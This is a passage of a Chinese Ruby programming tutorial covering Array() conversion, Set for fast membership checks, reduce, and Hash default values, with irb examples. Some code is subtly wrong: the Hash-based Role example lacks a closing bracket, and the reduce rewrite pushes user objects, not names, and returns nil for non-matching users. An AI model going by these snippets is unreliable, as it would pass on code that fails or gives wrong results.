<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Tom"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token builtin">Array</span><span class="token punctuation">(</span><span class="token keyword">nil</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token builtin">Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
我们可以看到，不论是数组，对象，nil，Array方法都能进行转化处理。如果传入的是一个自定义对象，则如果该对象能够响应<code>to_ary 或 to_a</code>方法，则该方法会被调用，如果对象上不存在这两个方法，则会直接封装为单元素的数组。</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">User</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">*</span>   attr_accessor <span class="token symbol">:name</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">004</span><span class="token operator">></span> <span class="token keyword">end</span>

irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">007</span><span class="token operator">></span> obj <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token operator">=></span> <span class="token comment">#&lt;User:0x00007fd519b1a3c8></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">008</span><span class="token operator">></span> obj<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string-literal"><span class="token string">"hello"</span></span>

irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">010</span><span class="token operator">></span> <span class="token builtin">Array</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token comment">#&lt;User:0x00007fd519b1a3c8 @name="hello">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们拓展一下，看看如果传入一个<code>Hash</code>会发生什么？</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">005</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token builtin">Array</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">name</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"tom"</span></span><span class="token punctuation">,</span><span class="token symbol">age</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"tom"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token symbol">:age</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>可以看到<code>Hash</code>被转为一个二维数组，而每个元素代表一个键值对。你也可以使用<code>Hash#[]</code>将数组转回<code>Hash</code>，<code>Hash.to_a</code>会转为数组。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">008</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token builtin">Hash</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"tom"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token symbol">:age</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token symbol">:name</span><span class="token operator">=></span><span class="token string-literal"><span class="token string">"tom"</span></span><span class="token punctuation">,</span> <span class="token symbol">:age</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>所以回到最上面的例子，当我修改为：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Demo</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>
    <span class="token builtin">Array</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>k<span class="token operator">|</span>
      p <span class="token string-literal"><span class="token string">"遍历数据: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">k</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>整个代码就会健壮的多。</p>
<blockquote>
<p>要点回顾</p>
</blockquote>
<ol>
<li>使用Array将nil及标量对象转为数组</li>
<li>不要将Hash传入Array()方法，会被转化为一个二维数组集合。<h3 id="第十八条：考虑使用集合高效检查元素的包含性"><a href="#第十八条：考虑使用集合高效检查元素的包含性" class="headerlink" title="第十八条：考虑使用集合高效检查元素的包含性"></a>第十八条：考虑使用集合高效检查元素的包含性</h3>比如我们有一个权限系统<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Role</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>permissions<span class="token punctuation">)</span>
    <span class="token variable">@name</span><span class="token punctuation">,</span><span class="token variable">@permissions</span> <span class="token operator">=</span> name<span class="token punctuation">,</span> permissions
  <span class="token keyword">end</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">can</span></span><span class="token operator">?</span> <span class="token punctuation">(</span>permission<span class="token punctuation">)</span>
    <span class="token variable">@permissions</span><span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span>permission<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
这里角色在创建时，会赋值一个权限列表，当执行某个操作时，检查是否拥有权限。<br>现在我们使用的是数组来存储，那数组存储就有个问题，它会遍历每一个元素，来判断是否拥有权限，那这个性能就需要优化了。并且在数组不断变大时，耗费的时间越久，如果权限不存在，则需要遍历每个元素后，才返回<code>false</code><br>那这里我们使用<code>Hash</code>结构：<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Role</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>permissions<span class="token punctuation">)</span>
    <span class="token variable">@name</span><span class="token punctuation">,</span><span class="token variable">@permissions</span> <span class="token operator">=</span> name<span class="token punctuation">,</span> <span class="token builtin">Hash</span><span class="token punctuation">[</span>permissions<span class="token punctuation">.</span>map <span class="token punctuation">&#123;</span><span class="token operator">|</span>p<span class="token operator">|</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
  <span class="token keyword">end</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">can</span></span><span class="token operator">?</span> <span class="token punctuation">(</span>permission<span class="token punctuation">)</span>
    <span class="token variable">@permissions</span><span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span>permission<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
这样就没问题了吧，但需要注意的是<code>Hash</code>存的是<code>K-V</code>结构，而我们只需要存<code>K</code>，那我们就使用<code>Set</code>结构<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Role</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>permissions<span class="token punctuation">)</span>
    <span class="token variable">@name</span><span class="token punctuation">,</span><span class="token variable">@permissions</span> <span class="token operator">=</span> name<span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>permissions<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">can</span></span><span class="token operator">?</span> <span class="token punctuation">(</span>permission<span class="token punctuation">)</span>
    <span class="token variable">@permissions</span><span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span>permission<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
需要注意的是不论是<code>Hash还是Set</code>，都会让原有的数据，打乱顺序。所以如果你不需要元素按照特定顺序，无需随机访问任一元素，并需要保证高效的检索，那就使用<code>Set</code><blockquote>
<p>要点回顾</p>
</blockquote>
</li>
</ol>
<ul>
<li><p>有限使用<code>Set</code>来高效检索</p>
</li>
<li><p>使用<code>Set</code>需要引入，因为它是标准库的。</p>
<h3 id="第十九条：如何通过reduce方法折叠集合"><a href="#第十九条：如何通过reduce方法折叠集合" class="headerlink" title="第十九条：如何通过reduce方法折叠集合"></a>第十九条：如何通过reduce方法折叠集合</h3><p>引入<code>Enumerable</code>模块的类会得到许多有用的实例方法，这里我们介绍<code>reduce</code>,也许我们使用更多的的是<code>map，select</code>方法。但在某些场景下<code>reduce</code>更强大<br><code>reduce</code>方法可以将一个数据结构转为另一个结构的折叠函数。</p>
</li>
<li><p>如果要使用<code>reduce</code>方法，需要引入<code>Enumerable</code>模块</p>
</li>
<li><p><code>block</code>会被源集合中的每个元素调用一遍，这与<code>each</code>方法很像，但<code>reduce</code>方法需要<code>block</code>产生一个返回值，这个返回值代表当前元素最终折叠的数据结构</p>
</li>
<li><p>累加器：代表目标数据结构起始值的对象，每一次<code>block</code>被调用，都会接受累加器，并返回一个新的累加器，在所有元素都被折叠到累加器后，也就是<code>reduce</code>的返回值</p>
</li>
</ul>
<p>我们先演示最简单的例子：数组求和</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">001</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>reduce<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>accumulator<span class="token punctuation">,</span>element<span class="token operator">|</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   accumulator <span class="token operator">+</span> element
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们来解释一下发生了什么：</p>
<ol>
<li><code>数组.reduce(0)</code>这里的reduce入参0，表示初始累加器。</li>
<li><code>|accumulator,element|</code>accumulator表示每次使用的累加器，第一次是初始累加器，也就是上面的0，element表示数组中每次遍历的元素</li>
<li><code>accumulator + element</code>这里并没有赋值，而是直接合计数值，并返回，因为我们累加器的数据结构就是<code>_Integer_</code></li>
<li>到了遍历到第二个元素，这时候累加器就变成了<code>0(初始累加器) + 1(遍历的第一个元素)</code></li>
<li>一直遍历完最后一个元素，返回值就是 1 + 2 + 3 = 6</li>
</ol>
<p>需要<strong>注意</strong>一点：<br>如果<code>reduce</code>方法入参不传递初始累加器，这样导致的一个问题就是，如果是一个空数组，就不会遍历数据，最终返回值为<code>nil</code>，所以我们应该尽量使用初始累加器<br>另一个便利的方式，我们可以给reduce传递一个符号(symbol)而不是块儿。每次迭代时都会将符号作为消息发送给累加器，而将当前元素作为参数，然后我们就可以重写数组求和方法：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">005</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>reduce<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">+</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>当然你也可以使用<code>&amp;</code>来快速产生块儿</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">005</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>reduce<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token operator">:</span><span class="token operator">+</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>我们再举一个例子，前面的章节中，我们说可以使用<code>Hash::[]</code>来将一个数组转为<code>Hash</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">007</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"tom"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"jack"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>reduce<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>hash<span class="token punctuation">,</span>element<span class="token operator">|</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">008</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>element <span class="token operator">=></span> <span class="token boolean">true</span><span class="token punctuation">)</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">009</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token string-literal"><span class="token string">"tom"</span></span><span class="token operator">=></span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"jack"</span></span><span class="token operator">=></span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>Hash#update</code>方法会返回一个可变的<code>Hash</code><br>我们再举一个空间利用率的例子：我们有一个学生信息列表，我们要筛选出年龄&gt;=21岁的人，并将名称汇总为一个列表，我们按照老办法可以使用：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">users<span class="token punctuation">.</span>select <span class="token punctuation">&#123;</span><span class="token operator">|</span>u<span class="token operator">|</span> u<span class="token punctuation">.</span>age <span class="token operator">>=</span> <span class="token number">21</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>map<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token symbol">:name</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里的效率并不高，因为先遍历筛选了一遍，然后再遍历了一遍将name组成新的数组，我们可以使用<code>reduce</code>进行优化</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">users<span class="token punctuation">.</span>reduce<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>names <span class="token punctuation">,</span> user<span class="token operator">|</span>
  names <span class="token operator">&lt;&lt;</span> user <span class="token keyword">if</span> user<span class="token punctuation">.</span>age <span class="token operator">>=</span> <span class="token number">21</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>通过这几个例子就可以看出强大之处</p>
<blockquote>
<p>要点回顾</p>
</blockquote>
<ul>
<li>总是需要给累加器一个初始值</li>
<li><code>reduce</code>接受的<code>block</code>总需要返回一个累加器<h3 id="第二十条：考虑使用默认哈希值"><a href="#第二十条：考虑使用默认哈希值" class="headerlink" title="第二十条：考虑使用默认哈希值"></a>第二十条：考虑使用默认哈希值</h3><blockquote>
<p>场景</p>
</blockquote>
</li>
</ul>
<p>我们要更新<code>Hash</code>中的数据，并将每个键对应的值<code>+1</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Demo</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">frequency</span></span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>
    array<span class="token punctuation">.</span>reduce<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>hash<span class="token punctuation">,</span>element<span class="token operator">|</span>
      hash<span class="token punctuation">[</span>element<span class="token punctuation">]</span> <span class="token operator">||=</span> <span class="token number">0</span>
      hash<span class="token punctuation">[</span>element<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
      hash
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

p Demo<span class="token punctuation">.</span>frequency<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">%w(A B C)</span></span><span class="token punctuation">)</span> <span class="token comment"># => &#123;"A"=>1, "B"=>1, "C"=>1&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面我们为了确保<code>Hash</code>中能找到对应的key进行计算，在每次计算前都先获取一下，如果不存在，则进行默认值赋值，因为如果获取不到，则默认返回<code>nil</code>。所以这一节我们来学习如果使用<code>Hash</code>的默认值</p>
<blockquote>
<p>方式1：</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Demo</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">frequency</span></span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>
    array<span class="token punctuation">.</span>reduce<span class="token punctuation">(</span><span class="token class-name">Hash</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>hash<span class="token punctuation">,</span>element<span class="token operator">|</span>
      hash<span class="token punctuation">[</span>element<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
      hash
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

p Demo<span class="token punctuation">.</span>frequency<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">%w(A B C)</span></span><span class="token punctuation">)</span> <span class="token comment"># => &#123;"A"=>1, "B"=>1, "C"=>1&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们将<code>&#123;&#125;</code>改为<code>Hash.new(0)</code>，这样就是表示<code>Hash</code>中如果找不到对应的<code>key</code>，则返回0。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h <span class="token operator">=</span> <span class="token class-name">Hash</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">004</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">.</span>keys
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">005</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:a</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token number">42</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">006</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">.</span>keys
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>这里有个小小的问题，如果默认值是一个可改变对象怎么办？</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">007</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h <span class="token operator">=</span> <span class="token class-name">Hash</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">008</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:missing_key</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">009</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:missing_key</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string-literal"><span class="token string">"Hey"</span></span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Hey"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">010</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">.</span>keys
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">011</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:missing_key</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Hey"</span></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到如果我默认值写成一个数组，当使用<code>h[:missing_key] &lt;&lt; &quot;Hey&quot;</code>时，默认值跟着发生了变化，也就是说下次遇到找不到的key返回的值，就不是空数组，而是被修改后的数组，而且还有个副作用：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">001</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h <span class="token operator">=</span> <span class="token class-name">Hash</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:weekdays</span><span class="token punctuation">]</span> <span class="token operator">=</span> h<span class="token punctuation">[</span><span class="token symbol">:weekdays</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string-literal"><span class="token string">"Monday"</span></span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Monday"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:months</span><span class="token punctuation">]</span> <span class="token operator">=</span> h<span class="token punctuation">[</span><span class="token symbol">:months</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string-literal"><span class="token string">"January"</span></span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Monday"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"January"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">004</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:weekdays</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Monday"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"January"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">005</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:months</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Monday"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"January"</span></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不同的键指向的value是同一个，这不是我们想看到的，我们希望当访问到不存在的键时，能返回一个全新的数组。</p>
<blockquote>
<p>方法2：</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">006</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h <span class="token operator">=</span> <span class="token class-name">Hash</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token punctuation">&#123;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
<span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
